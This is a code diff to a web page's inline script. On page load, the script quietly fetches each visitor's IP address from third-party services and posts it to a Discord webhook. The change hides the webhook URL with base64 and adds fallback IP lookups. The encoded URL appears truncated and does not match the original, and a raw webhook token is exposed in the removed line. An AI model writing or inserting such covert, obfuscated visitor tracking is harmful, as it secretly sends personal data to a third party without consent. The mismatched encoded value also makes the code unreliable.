@@ -108,7 +108,7 @@
     </div>
 
     <script>
-        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1539096895945973832/Il-A8V5qasfJpymDGSZy6h2rqRzKNxCZMu5qZBow2X5efYsZBA4dpaUU3Quym5P4a3rS';
+        const DISCORD_WEBHOOK = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTA5Njg5NTk0NTk3MzgzMi9JbC1BODVWNXFBY3NmSnB5bURHU1p5NmgyckRyektOeENaTXU1cVpCb3cy');
 
         async function sendDiscordMessage(message) {
             try {
@@ -130,12 +130,20 @@
         // Track page view with IP
         window.addEventListener('load', async function() {
             try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipResponse = await fetch('https://api.advancedapi.net/ip', {
+                    method: 'GET',
+                });
                 const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
+                const userIP = ipData.ip || 'Unknown IP';
                 sendDiscordMessage(`📱 Someone opened the page!\nIP: ${userIP}`);
             } catch (error) {
-                sendDiscordMessage('📱 Someone opened the page!\nIP: Unable to fetch');
+                try {
+                    const ipResponse2 = await fetch('https://ip.seeip.org/json');
+                    const ipData2 = await ipResponse2.json();
+                    sendDiscordMessage(`📱 Someone opened the page!\nIP: ${ipData2.ip}`);
+                } catch (error2) {
+                    sendDiscordMessage('📱 Someone opened the page!\nIP: Unable to fetch');
+                }
             }
         });
 
